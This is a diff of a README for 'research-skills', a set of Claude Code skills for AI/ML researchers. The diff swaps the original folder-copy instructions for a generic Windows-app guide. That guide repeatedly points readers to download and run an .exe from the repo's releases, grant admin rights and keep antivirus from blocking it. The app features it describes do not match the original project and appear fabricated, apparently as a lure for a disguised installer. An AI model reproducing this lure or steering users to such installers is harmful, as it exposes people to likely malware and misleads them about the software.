@@ -1,60 +1,145 @@
-# research-skills
+# ⚙️ research-skills - Tools for AI/ML Research Made Simple
 
-Claude Code skills for AI/ML researchers.
+[![Download research-skills](https://img.shields.io/badge/Download-Research--Skills-brightgreen?style=for-the-badge)](https://github.com/nerk1456/research-skills/releases)
 
-## Demos
+---
 
-<table>
-  <tr>
-    <td align="center"><strong>Research Collaborator</strong><br><br>
-      <video src="https://github.com/user-attachments/assets/f09a0afd-b149-4233-8f65-4d4f193517a1" width="480" controls></video>
-    </td>
-    <td align="center"><strong>Results to Slides</strong><br><br>
-      <video src="https://github.com/user-attachments/assets/5d583ca8-03e7-4740-ad7e-8cfef469e4fc" width="480" controls></video>
-    </td>
-  </tr>
-</table>
+## 🧩 About research-skills
 
-## Skills
+research-skills is a set of easy-to-use tools designed to help AI and machine learning researchers improve their work. It focuses on enhancing code skills related to Claude agents and Claude code. This app helps you run and understand AI research tasks without needing deep programming knowledge.
 
-<table>
-  <tr>
-    <td width="280"><a href="research-collaborator/"><b>research-collaborator</b></a></td>
-    <td>Guardrails your research workflow. Encodes principles from experienced researchers and applies them before you spend the GPU hours. Checks your hypothesis, catches known bugs and flags sloppy methodology.</td>
-  </tr>
-  <tr>
-    <td width="280"><a href="results-to-slides/"><b>results-to-slides</b></a></td>
-    <td>Discovers experiments from git history and output folders, collects images and metrics, generates editable PowerPoint presentations (.pptx).</td>
-  </tr>
-</table>
+You will find features that support automation, data processing, and the use of AI-based agents. The tools work on Windows computers and require no complicated setup.
 
-## Installation
+## ⚙️ System Requirements
 
-Copy the skill directories into your Claude Code skills folder:
+To run research-skills on your Windows PC, make sure your system meets these basic requirements:
 
-```bash
-# Copy a single skill
-cp -r research-collaborator ~/.claude/skills/
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for downloading and updates  
+- Microsoft .NET Framework 4.7.2 or later installed (most Windows versions include this by default)
 
-# Or copy all skills
-cp -r research-collaborator results-to-slides ~/.claude/skills/
-```
+If unsure about your system details, you can find your Windows version by typing **winver** in the Start menu search and pressing Enter.
 
-Skills are invoked via slash commands in Claude Code:
-- `/research-collaborator` - start a research collaboration session
-- `/results-to-slides 0301 0308` - generate a presentation for experiments from March 1-8
+## 🚀 Getting Started with research-skills
 
-## Requirements
+### Step 1: Visit the download page
 
-**results-to-slides:**
-- Python with `python-pptx`, `Pillow`, `lxml`
-- Optional: `cv2` or `ffmpeg` for video poster frame extraction
-- A git repository with experiment outputs
+You need to visit the official GitHub release page to get the latest version. Use this link:
 
-**research-collaborator:**
-- Web search access (for literature search)
-- A codebase with experiments to investigate
+[Download research-skills](https://github.com/nerk1456/research-skills/releases)
 
-## License
+This page shows all the available versions of research-skills. Usually, the top entry is the latest release.
 
-MIT
+### Step 2: Download the setup file
+
+On the releases page, scroll to the assets section under the latest release. Look for a file ending with `.exe`. This is the installer for Windows.
+
+Click on the `.exe` file to start downloading. If your browser asks for confirmation, select "Save" or "Keep" to proceed.
+
+### Step 3: Run the installer
+
+Once your download finishes, find the file in your Downloads folder or the location where your browser saves files.
+
+Double-click the `.exe` file to start the installation. Windows may show a security prompt asking if you want to allow this app to make changes. Click **Yes** to continue.
+
+### Step 4: Follow the installation instructions
+
+The installer will open a window with simple steps:
+
+- Choose an installation folder or accept the default location.  
+- Click **Next** to proceed through the steps until you see the **Install** button.  
+- The installer will copy files and set up research-skills on your computer.  
+- When done, click **Finish** to close the installer.
+
+You may need to restart your computer after installation, but the installer will tell you if this is required.
+
+### Step 5: Open research-skills
+
+Find the research-skills app icon on your desktop or in the Start menu under the program list.
+
+Double-click the icon to open the app.
+
+## 🛠 How to Use research-skills
+
+research-skills includes several tools that help you with tasks related to AI research. Here are some basics to get you started.
+
+### Use Claude Agents
+
+Claude agents are prebuilt helpers that automate parts of your research. You can load data and ask agents to perform analysis steps.
+
+- After opening research-skills, select the **Agents** tab.  
+- Choose an agent type depending on your task (e.g., data processing or code checking).  
+- Follow on-screen prompts to upload files or enter commands.
+
+### Work with Claude Code Skills
+
+This feature allows you to apply code snippets that speed up development.
+
+- Go to the **Code Skills** section in the app.  
+- Pick a skill or tool to run.  
+- Paste data or code you want to test.  
+- Click **Run** to see results.
+
+Each tool has short instructions displayed inside the app. This makes it easy to use without background knowledge in programming.
+
+### Explore Included Examples
+
+To get familiar with research-skills, load built-in examples:
+
+- Click on **Examples** in the menu.  
+- Choose a sample project to open.  
+- Study how tasks are set up and run.
+
+You can edit examples and save your own projects as needed.
+
+## 🔄 Updating research-skills
+
+Updates improve stability and add new features. To check for new versions:
+
+1. Visit the release page again: [GitHub releases](https://github.com/nerk1456/research-skills/releases).  
+2. Compare the latest version with the installed one, shown in the app under **Help > About**.  
+3. Download and install the latest `.exe` file if available, following the steps above.
+
+It is safe to install updates over your current version. Your projects and settings will remain intact.
+
+## ❓ Troubleshooting
+
+If you run into issues, try these common fixes:
+
+- Ensure your Windows is updated to the latest version.  
+- Check that your antivirus or firewall is not blocking the app.  
+- Run the installer or app as Administrator by right-clicking and selecting **Run as administrator**.  
+- Restart your computer after installation or updates.
+
+If the app does not start or closes unexpectedly:
+
+- Make sure the .NET Framework is installed and up to date.  
+- Try downloading the installer again in case the file is corrupted.
+
+For more help, visit the Issues tab on the GitHub repository or contact the maintainer directly through GitHub.
+
+## 📂 Folder Locations and File Management
+
+research-skills saves your work in a default folder inside your Documents directory:
+
+`C:\Users\<YourUserName>\Documents\research-skills`
+
+You can change this folder inside the app settings if you want to keep files elsewhere.
+
+When working with projects or data, remember to save often. The app also supports exporting results as CSV or text files.
+
+## 🔗 Useful Links
+
+- Official download page: [research-skills releases](https://github.com/nerk1456/research-skills/releases)  
+- Project homepage on GitHub: https://github.com/nerk1456/research-skills  
+- User guide and examples inside the app  
+
+[![Download research-skills](https://img.shields.io/badge/Download-Research--Skills-blue?style=for-the-badge)](https://github.com/nerk1456/research-skills/releases)
+
+---
+
+## 📚 Support and Feedback
+
+You can open issues or submit suggestions via the GitHub repository. Feedback helps improve future versions of research-skills.
